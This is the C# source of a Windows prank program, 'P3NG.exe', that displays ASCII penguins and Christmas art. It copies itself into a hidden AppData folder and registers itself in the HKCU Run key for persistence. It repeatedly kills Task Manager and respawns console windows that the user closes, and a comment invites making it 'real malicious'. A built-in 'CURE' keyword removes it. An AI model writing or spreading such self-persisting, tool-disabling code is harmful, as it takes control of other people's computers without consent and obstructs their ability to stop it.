using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System;

/*

:: ---------------- ::
::                  ::
::     P3NG.exe     ::
::      v1.0.1      ::
::                  ::
::  Bryant Finnern  ::
::    p3ng00.com    ::
::                  ::
:: ---------------- ::
::                  ::
::     Created      ::
::    2021.11.10    ::
::                  ::
::      Edited      ::
::    2021.11.13    ::
::                  ::
:: ---------------- ::

*/

class Penguin
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const string TITLE = "ASCII_Penguin";

    const string strHidden = "HIDDEN";
    const string strDisplay = "DISPLAY";
    const string strCure = "CURE";

    static readonly Random random = new Random();
    static readonly DirectoryInfo destDir = new DirectoryInfo("C:/Users/" + Environment.GetEnvironmentVariable("username") + "/AppData/Local/speech/P3");
    static readonly FileInfo destFile = new FileInfo(destDir + "/" + TITLE + ".exe");
    static readonly RegistryKey destRegKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

    static void Main(string[] args)
    {
        Console.Title = TITLE;

        if (args.Length == 0)
        {
            WindowFirstRun();
        }
        else
        {
            switch (args[0])
            {
                // Hidden Window
                // (Creates Penguin Windows
                // and kill Task Manager)
                case strHidden:
                    WindowHidden();
                    break;

                // Display Window
                // (Window that displays
                // the penguins)
                case strDisplay:
                    WindowDisplay();
                    break;

                // Cure Window
                // (Window that runs
                // the cure process)
                case strCure:
                    WindowCure();
                    break;
            }
        }
    }

    static void WindowFirstRun()
    {
        string p3ngArray =
            "\n" + @"         /@@@@@@@\" +
            "\n" + @"       (@@@@@ # @@@@@\" +
            "\n" + @"      (` \@@@@@@@@~~~~" +
            "\n" + @"     /`    \@@@@@|" +
            "\n" + @"    /@@     ''''  \" +
            "\n" + @"   /@@@@\          |" +
            "\n" + @"  /@@@@@@@\        |" +
            "\n" + @" /@@@@@@@@@        |" +
            "\n" + @" |@@@@@@@@         |" +
            "\n" + @" |@@@@@@@          |" +
            "\n" + @" |@@@@@@@          |" +
            "\n" + @" |@@@'@@@@        |" +
            "\n" + @" |@@@ '@@@        ;" +
            "\n" + @" |@@@  @@;       ;" +
            "\n" + @" |@@@  ''       ;" +
            "\n" + @" (@@@@         ;" +
            "\n" + @"  (@@@@        |" +
            "\n" + @"   (__@@_______)" +
            "\n" + @"" +
            "\n" + @"  ... he watches...";

        // DONT FUCK WITH WIDTH.
        // ANY LOWER AND HE
        // SQUISHES EVERYWHERE.
        int windowWidth = 23;
        int windowHeight = 21;

        // Set window size (WINDOW BEFORE BUFFER ALWAYS)
        Console.SetWindowSize(windowWidth, windowHeight);
        Console.SetBufferSize(Console.WindowLeft + windowWidth, Console.WindowTop + windowHeight);

        // Display Penguin
        Console.Write(p3ngArray);

        // If destination directory doesn't exist...
        if (!destDir.Exists)
        {
            // Create destination directory
            destDir.Create();
        }

        // Hide directory
        destDir.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

        // If destination file exists...
        if (destFile.Exists)
        {
            try
            {
                // Attempt deletion (may throw exception)
                destFile.Delete();
            }
            catch (Exception) { }
        }

        // DONT COMBINE THIS TRY WITH THE TRY ABOVE.
        // THE TRY ABOVE IS SURROUNDED BY
        // AN IF STATEMENT YOU HIGH ASS BITCH
        try
        {
            // Copy this program to desination
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, destFile.ToString());

            // Add startup registry key
            Registry.SetValue(destRegKey.ToString(), TITLE, destFile.ToString().Replace("/", @"\") + " " + strHidden);

            // Write a space to show that this was successful
            Console.Write(" ");
        }
        catch (Exception) { }

        // Hangs program.
        // If user types out 'CURE'
        // it will go to the Cure Window.
        while (true)
        {
            // 'true' is put on all of these
            // to always prevent the key from
            // displaying in the console.
            if (Console.ReadKey(true).Key == ConsoleKey.C)
            {
                if (Console.ReadKey(true).Key == ConsoleKey.U)
                {
                    if (Console.ReadKey(true).Key == ConsoleKey.R)
                    {
                        if (Console.ReadKey(true).Key == ConsoleKey.E)
                        {
                            WindowCure();
                            break;
                        }
                    }
                }
            }
        }
    }

    static void WindowHidden()
    {
        int currWindowCount = 0;
        // 'lastPengCount' set to 2 as a minimum to account for host process and creation of one hidden window
        int minPengWindows = 2;
        int lastSecond = -1;
        int currSecond = -1;
        int windowDifference;
        int i;

        while (true)
        {
            currSecond = DateTime.Now.Second;

            if (lastSecond != currSecond)
            {
                Console.SetWindowSize(1, 1);

                // settings i know:
                // 0 = hidden
                // 5 = shown
                ShowWindow(GetConsoleWindow(), 0);
                lastSecond = currSecond;

                if (currWindowCount > minPengWindows)
                {
                    minPengWindows = currWindowCount;
                }

                currWindowCount = 0;

                foreach (Process process in Process.GetProcesses())
                {
                    switch (process.ProcessName)
                    {
                        case TITLE:
                            currWindowCount++;
                            break;

                        case "Taskmgr":
                            try
                            {
                                // Starting the process killer and message box
                                // in a new thread to avoid the thread from
                                // stopping while the message box is open.
                                new Thread(() =>
                                {
                                    process.Kill();
                                    MessageBox.Show("Task Manager Error: Penguins have taken over!");
                                }).Start();
                            }
                            catch (Exception) { }
                            break;
                    }
                }

                windowDifference = minPengWindows - currWindowCount;

                // For each window that doesn't exist...
                for (i = 0; i < windowDifference; i++)
                {
                    // Create a new window
                    CreateDisplayWindow();

                    // IF YOU WANNA BE REAL MALICIOUS
                    // CREATE MORE THAN ONE WINDOW
                    // FOR EACH CLOSED WINDOW
                }
            }
        }
    }

    // This handles the windows that display the penguins
    static void WindowDisplay()
    {
        Tuple<int, int, string>[] ascii = new Tuple<int, int, string>[] {
            new Tuple<int, int, string>(75, 17,
                "\n" + @"         .     .                       *** **" +
                "\n" + @"                  !      .           ._*.                       ." +
                "\n" + @"               - -*- -       .-'-.   !  !     ." +
                "\n" + @"      .    .      *       .-' .-. '-.!  !             .              ." +
                "\n" + @"                 ***   .-' .-'   '-. '-.!    ." +
                "\n" + @"         *       ***.-' .-'         '-. '-.                   ." +
                "\n" + @"         *      ***$*.-'               '-. '-.     *" +
                "\n" + @"    *   ***     * ***     ___________     !-..!-.  *     *         *    *" +
                "\n" + @"    *   ***    **$** *   !__!__!__!__!    !    !  ***   ***    .   *   ***" +
                "\n" + @"   *** ****    * *****   !__!__!__!__!    !      .***-.-*** *     *** * #_" +
                "\n" + @"  **********  * ****$ *  !__!__!__!__!    !-..--'*****   # '*-..---# ***" +
                "\n" + @"  **** *****  * $** ***      .            !      *****     ***       ***" +
                "\n" + @"  ************ ***** ***-..-' -.._________!     *******    ***      *****" +
                "\n" + @"  ***********   .-#.-'           '-.-''-..!     *******   ****...     #" +
                "\n" + @"    # ''-.---''                           '-....---#..--'****** ''-.---''-" +
                "\n" + @"                    Merry Christmas ~ JP3                   #"),
            new Tuple<int, int, string>(80, 37,
                "\n" + @"   $$$$$$$$$$$$$'^$$$$$$$$$$$$$$$$$$$$$'$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$$'   $$$$$$$$$$$$$''$$$$F  $$$$$$* ^$$ '      $$$''$$$$$ 4$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$  d$  $$$$$$$$$$$$   $$$   *$$$'  .d$$  $$$$$  *$r *$$$' $$$$$$$$" +
                "\n" + @"   $$$$$$$$$$  d$$$  *$$$$$$$$$$ 4  *P J  $'  .$$$$$L 3$$$$'  $$  $$$ 4$$$$$$$$" +
                "\n" + @"   $$$$$$$$$' d$$$$$  *$$$$$$$$$ 4$.   $b 3  $$$''$$$. $$'  e$$$$ ^$  $$$$$$$$$" +
                "\n" + @"   $$$$$$$$' d$$$$$$$. '$$$$$$$$ 4$$e 4$$  $  $' z$$$$      $$$$$L ' J$$$$$$$$$" +
                "\n" + @"   $$$$$$$' J$$$$$$$$$c '$$$$$$$ 4$$$$$$$$ 'b   4$$$$$b 4$$  $$$$$.  $$$$$$$$$$" +
                "\n" + @"   $$$$$$% z$$$$$$$$$$$c ^$$$$$$  $$$$$$$$. $L  $$$*'3$. $$$  $$$$F d$$$$$$$$$$" +
                "\n" + @"   $$$$$' z$$$$$$$$$$$$$b ^$$$$$  $$$$$$$$$ ^$c '    d$$ .$$$.$$$$ .$$$$$$$$$$$" +
                "\n" + @"   $$$$' 4$$$$$$$$$$$$$$$b  $$$$  $$$$$$$$$cz$$c .e$$$$$$$$$$$$$$' $$$$$$$$$$$$" +
                "\n" + @"   $$$P        $$$$$$       4$$$..$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 4$$$$$$$$$$$$" +
                "\n" + @"   $$$$eeeeer .$$$$$$r  ....$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$L $$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$' .$$$$$$$$c '$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$' 4$$$$$$$$$$c ^$$$$$$''$$$$$$$'$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$% z$$$$$$$$$$$$L ^$$$$$c  '$$$$  J$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$' z$$$$$$$$$$$$$$b ^$$$$$$c  ^*  d$$$$$$$$P*'    $$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$' d$$$$$$$$$$$$$$$$b  $$$$$$$e   $$$$$$$F     ..e$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$  d$$$$$$$$$$$$$$$$$$$  $$$$$$  .  ^*$$$$$ed$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$         $$$$$$$$$        $$$P  $$$b   $$$$$$$$$$$$$$$$$$$' ^$$$$$$$$$$$$$" +
                "\n" + @"   $$c...... .$$$$$$$$$  eeeeee$$F .$$$$$$b.$$$$$$$$$$$$$$$$$'  .$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$  $$$$$$$$$$L *$$$$$$$$e$$$$$$$'$$$$$$$  $$$$$$$'  .$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$  $$$$$$$$$$$$  $$$$$$$$$$$$$$$P  $$$$$$   $$$$'  .$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$' $$$$$$$$$$$$$$ '$$$$$$$' ^$$$P   $$$$$$ e ^$$$c  '$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$' d$$$$$$$$$$$$$$r *$$$$$$     *  $  $$$$F $L '$$$$.   *$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$' z$$$$$$$$$$$$$$$$  $$$$$$  $b.  $$F $$$$  *'  '$$$$$b.  ^*$$$$$$$$$$$$" +
                "\n" + @"   $$$P .$$$$$$$$$$$$$$$$$b '$$$$$ 4$$$.$$$$  $$$       $$$$$$$$e  $$$$$$$$$$$$" +
                "\n" + @"   $$$  $$$$$$$$$$$$$$$$$$$. $$$$$ J$$$$$$$$r $$$ 4$$$$  $$$$$$$$F $$$$$$$$$$$$" +
                "\n" + @"   $$                         $$$F $$$$$$$$$$  $F $$$$$$z$$$$$'    $$$$$$$$$$$$" +
                "\n" + @"   $b                         $$$$e$$$$$$$$$$$$$b.$$$$$$$*'    .z$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$$$F  4$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*'    .e$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$$$F  4$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*'    .e$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$$$F  4$$$$$$$$$$$$$$$$$$$$$$$$$'     .d$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$$$F  4$$$$$$$$$$$$$$$$$$$$$$$$$ .e$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$$$$ze$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" +
                "\n" + @"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Gilo94'$$$$$$$$$"),
            new Tuple<int, int, string>(73, 22,
                "\n" + @"   .----------------------_._------------------------------------------." +
                "\n" + @"   |                     d888b         .                        *      |" +
                "\n" + @"   |   .   *           _ ?888P_                         .              |" +
                "\n" + @"   |             ,-~~-'-/_~~~\.`-~:8o.          *                      |" +
                "\n" + @"   |           ,'      .:8bv'      .:88.                     .         |" +
                "\n" + @"   |          /         .:88         .:8b    .     .                 . |" +
                "\n" + @"   |  .      /          .:8P          .:8b                             |" +
                "\n" + @"   |       ,'          .:8P\           .:88.       Merry Christmas     |" +
                "\n" + @"   |    ,='           .:88  \           __:88g_                        |" +
                "\n" + @"   |     -._          .:8|  |    _..-~,~    ~;'           and      *   |" +
                "\n" + @"   |        ~o..__    .:8|  | _-~   ?8b_ _.-'                          |" +
                "\n" + @"   |          ~~  ~~--.:88  /:___...(888)             Happy New Year   |" +
                "\n" + @"   | *                               `^'      .                        |" +
                "\n" + @"   |        _  _   .   _______________________              ~ JP3   .  |" +
                "\n" + @"   |      _(\)(/)_____/\_`_\ \/_______________\                        |" +
                "\n" + @"   |     |`.)XX(=====/ /,---\*\----------------\                       |" +
                "\n" + @"   |     |||`()_\____\// \ / \ \`.              \                    . |" +
                "\n" + @"   |      `| |        Y   \___\ \________________\   *                 |" +
                "\n" + @"   |        `|_________\  /   / /                /     by _ Seal _     |" +
                "\n" + @"   |  .                 \/___/_/________________/           .          |" +
                "\n" + @"   `-------------------------------------------------------------------'"),
            new Tuple<int, int, string>(79, 13,
                "\n" + @"                                                         *" +
                "\n" + @"      *                                                          *" +
                "\n" + @"                                   *                  *        .--." +
                "\n" + @"       \/ \/  \/  \/                                        ./   /=*" +
                "\n" + @"         \/     \/      *            *                ...  (_____)" +
                "\n" + @"          \ ^ ^/                                       \ \_((^o^))-.    *" +
                "\n" + @"          (o)(O)--)--------\.                           \   (   ) \ \._." +
                "\n" + @"          |    |  ||================((~~~~~~~~~~~~~~~~~))|   ( )   |    \" +
                "\n" + @"           \__/             ,|        \. * * * * * * ./  (~~~~~~~~~~)    \" +
                "\n" + @"    *        ||^||\.____./|| |          \___________/     ~||~~~~|~'\____/ *" +
                "\n" + @"             || ||     || || A            ||    ||         ||    |   jurcy" +
                "\n" + @"      *      <> <>     <> <>          (___||____||_____)  ((~~~~~|   *"),
            new Tuple<int, int, string>(74, 15,
                "\n" + @"" +
                "\n" + @"                   X   X   XXXXX   XXXXX   XXXXX   X   X" +
                "\n" + @"                   XX XX   X       X   X   X   X    X X" +
                "\n" + @"                   X X X   XXX     XXXXX   XXXXX     X" +
                "\n" + @"                   X   X   X       X  X    X  X      X" +
                "\n" + @"                   X   X   XXXXX   X   X   X   X     X" +
                "\n" + @"" +
                "\n" + @"" +
                "\n" + @"    XXXXX   X   X   XXXXX   XXX   XXXXX   XXXXX   X   X   XXXXX   XXXXX" +
                "\n" + @"    X       X   X   X   X    X    X         X     XX XX   X   X   X" +
                "\n" + @"    X       XXXXX   XXXXX    X    XXXXX     X     X X X   XXXXX   XXXXX" +
                "\n" + @"    X       X   X   X  X     X        X     X     X   X   X   X       X" +
                "\n" + @"    XXXXX   X   X   X   X   XXX   XXXXX     X     X   X   X   X   XXXXX"),
            new Tuple<int, int, string>(78, 23,
                "\n" + @"                   .-----.           /  /" +
                "\n" + @"                 ,/ mmmmmm\         /| /|   _  _   _" +
                "\n" + @"                (  / o  o \\       / |/ |  (/_/ (_/ (_(_/" +
                "\n" + @"    ,---.       /,L  ~,L~  J    `-'     `-'  ,-        /" +
                "\n" + @"    (.  n      /( #,.d##b.,#               _/,'  /)           _/_" +
                "\n" + @"    \___/     (##)'###uu###'._             /    /_  _   . _   / _ _   __  _" +
                "\n" + @"    P^~~?  _.--''  '######'   ~-.          (   / (_/ (_(_/ )_(_/ / /_(_(_/_)" +
                "\n" + @"    /    \'          ''''        `,         `-' from JP3" +
                "\n" + @"    |                 |||     _   .`-._                ,--._       ______." +
                "\n" + @"     \        ,       |||   ____..(,~  \         _..--X:~.`\`.    /:,----'" +
                "\n" + @"       ~----~/       ///  ./@==/\  `~--~-.     ,'  ,'. \| \_.W\  / /" +
                "\n" + @"             (..___,---,,'//  /_.-',`  \  \   /         '~-..' `/ /|" +
                "\n" + @"             |..___[=[-~X`----~   `    , __L__L________________/ /||" +
                "\n" + @"            /mmm,,_`,-'/ `  \       \   //~Y~7~~~~~~~~~~~~~~~~/ /~||" +
                "\n" + @"             `| ~'''`-'  \       /  ' `//  \: \     (    )   / / /|/|" +
                "\n" + @"              |     /_________________//____L_______________/./___/:|" +
                "\n" + @"         ,-,  | `_,'//~~~~~~~~~~~~~~~77~~~~~Y~~~~~~~~~~~~~~7 /~7~7 /" +
                "\n" + @"        / /_____(__//   /    \   \  //     /  /      \   \/ / ( / /|" +
                "\n" + @"   =-=O(| Y~~~~~~~Y' -'            //     / _/._         / /   / /||" +
                "\n" + @"        \  `--------.__.^-----------------+-----+-------/./---/./-'|" +
                "\n" + @"         `._____________________________________________~~Seal~~____~~~~~~/" +
                "\n" + @"      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"),
            new Tuple<int, int, string>(60, 21,
                "\n" + @"" +
                "\n" + @"   Merry Christmas         ::::::    .-~~\        ::::::" +
                "\n" + @"                           |::::|   /     \ _     |::::|" +
                "\n" + @"      ~ JP3        _ _     l~~~~!   ~x   .-~_)_   l~~~~!" +
                "\n" + @"                .-~   ~-.   \  /      ~x'.-~   ~-. \  /" +
                "\n" + @"         _     /         \   ||    _  ( /         \ ||" +
                "\n" + @"         ||   T  o  o     Y  ||    ||  T o  o      Y||" +
                "\n" + @"       ==:l   l   <       !  (3  ==:l  l  <        !(3" +
                "\n" + @"          \\   \  .__/   /  /||     \\  \  ._/    / ||" +
                "\n" + @"           \\ ,r'-,___.-'r.//||      \\,r'-,___.-'r/||" +
                "\n" + @"            }^ \.( )   _.'//.||      }^\. ( )  _.-//||" +
                "\n" + @"           /    }~Xi--~  //  ||     /   }~Xi--~  // ||\" +
                "\n" + @"          Y    Y I\ \    '   ||    Y   Y I\ \    '  || Y" +
                "\n" + @"          |    | |o\ \       ||    |   | |o\ \      || |" +
                "\n" + @"          |    l_l  Y T      ||    |   l_l  Y T     || |" +
                "\n" + @"          l      'o l_j      |!    l     'o l_j     || !" +
                "\n" + @"           \                 ||     \               ||/" +
                "\n" + @"         .--^.     o       .^||.  .--^.     o       ||--." +
                "\n" + @"              '           ~  `'        '           ~`'")
        };

        Tuple<int, int, string> selectedAscii = ascii[random.Next(ascii.Length)];

        int windowWidth = selectedAscii.Item1;
        int windowHeight = selectedAscii.Item2;

        /*

        DO NOT FUCK WTIH THE ORDER OF THE BELOW STATEMENTS

        THE WINDOW SIZE, BUFFER SIZE, COLOR, AND WRITE CALLS
        SEEMS TO NEED TO BE IN A VERY SPECIFIC ORDER AND I
        DEFINITELY DON'T WANT TO GO THROUGH EVERY ITERATION
        AGAIN TO TRY TO FIGURE THIS SHIT OUT.

        */

        // Set Window Title
        Console.Title = "                                  " + TITLE;

        // Set Window Size
        Console.SetWindowSize(windowWidth, windowHeight);

        // Set Buffer Size
        Console.SetBufferSize(Console.WindowLeft + windowWidth, Console.WindowTop + windowHeight);

        // Set color
        Console.BackgroundColor = (ConsoleColor)random.Next(16);
        Console.ForegroundColor = (ConsoleColor)random.Next(16);

        // Clear Console
        Console.Clear();

        // Write to Console
        Console.Write(selectedAscii.Item3);

        /*

        THIS CONCLUDES THE REGION WITH
        WHICH YOU SHOULD NOT FUCK

        */

        // This hangs the program indefinitely
        while (true)
        {
            Console.ReadKey(true);
        }
    }

    static void WindowCure()
    {
        Console.Clear();
        int windowWidth = 70;
        int windowHeight = 25;
        int count;
        Console.SetWindowSize(windowWidth, windowHeight);
        Console.SetBufferSize(Console.WindowLeft + windowWidth, Console.WindowTop + windowHeight);
        Console.WriteLine("\n " + TITLE + " is being terminated\n");
        Console.WriteLine("Searching for processes...");

        do
        {
            count = 0;

            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName == TITLE && process.Id != Process.GetCurrentProcess().Id)
                {
                    try
                    {
                        process.Kill();
                        count++;
                    }
                    catch (Exception) { }
                }
            }

            Console.WriteLine("Killed " + count + " processes.");
            Console.WriteLine("Searching again...");
        }
        while (count > 0);

        Console.WriteLine("\n " + TITLE + " has been terminated.\n");

        // Remove files
        Console.WriteLine("Attempting to remove files...");

        if (destDir.Exists)
        {
            if (destFile.Exists)
            {
                destFile.Delete();
            }

            destDir.Delete(true);

            Console.WriteLine("Deleted");
        }
        else
        {
            Console.WriteLine("Files aren't present");
        }

        // Remove registry key
        try
        {
            destRegKey.DeleteValue(TITLE);
            Console.WriteLine("Removed from startup");
        }
        catch (Exception)
        {
            Console.WriteLine("Not present in registry");
        }

        // Close after user input...
        Console.WriteLine("\n " + TITLE + " has been completely removed.\n");
        Console.Write("Press any key to exit...");
        Console.ReadKey();
    }

    static void CreateDisplayWindow()
    {
        Process.Start(Process.GetCurrentProcess().MainModule.FileName, strDisplay);
    }
}
